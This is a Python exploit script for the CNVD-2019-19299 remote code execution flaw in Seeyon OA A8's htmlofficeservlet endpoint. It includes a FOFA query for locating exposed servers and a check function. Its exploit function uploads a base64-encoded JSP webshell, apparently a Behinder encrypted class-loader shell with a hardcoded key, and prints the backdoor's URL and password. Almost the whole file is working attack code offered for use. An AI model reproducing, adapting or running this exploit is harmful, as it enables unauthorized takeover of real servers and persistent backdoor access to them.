#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import sys
import requests
import base64
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='CNVD-2019-19299'
AUTHOR="Joker"
REMARK='致远OA A8 htmlofficeservlet RCE '
FOFA_RULE='title="致远A8-V5协同管理软件 V6.1sp1"'
######################################################

def poc(target):
    result = {}
    vuln_url = target + "/seeyon/htmlofficeservlet"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if r.status_code==200 and 'htmoffice' in r.text:
            result['target'] = target
            result['poc'] = NAME
            return result
    except:
        pass

def exp(target):
    print('[#]开始写入webshell')
    vuln_url= target + "/seeyon/htmlofficeservlet"
    payload="REJTVEVQIFYzLjAgICAgIDM1MSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNTMzICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVgpPUFRJT049UzNXWU9TV0xCU0dyCmN1cnJlbnRVc2VySWQ9elVDVHdpZ3N6aUNBUExlc3c0Z3N3NG9Fd1Y2NgpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYKUkVDT1JESUQ9cUxTR3c0U1h6TGVHdzRWM3dVdzN6VW9Yd2lkNgpvcmlnaW5hbEZpbGVJZD13VjY2Cm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2CkZJTEVOQU1FPXFmVGRxZlRkcWZUZFZheEplQUpRQlJsM2RFeFF5WU9kTkFsZmVheHNkR2hpeVlsVGNBVGRPUldaTjF5dmRSMzVuSHpzCm5lZWRSZWFkRmlsZT15UldaZEFTNgpvcmlnaW5hbENyZWF0ZURhdGU9d0xTR1A0b0V6TEtBejQ9aXo9NjYKPCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iM2M5NjFmNDlkNWZhOTZjNSI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT42ZTRmMDQ1ZDRiODUwNmJmNDkyYWRhN2UzMzkwZDdjZQ=="
    data = base64.b64decode(payload)
    headers = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    r = requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
    if r.status_code==500 and '"message":null' in r.text:
        print('[+]成功写入webshell')
        print('[+]默认冰蝎Webshell地址(szxsd):' + target + '/seeyon/Faltform.jsp')
    else:
        print('写入webshell失败！')       

if __name__ == '__main__':
    poc("https://127.0.0.1")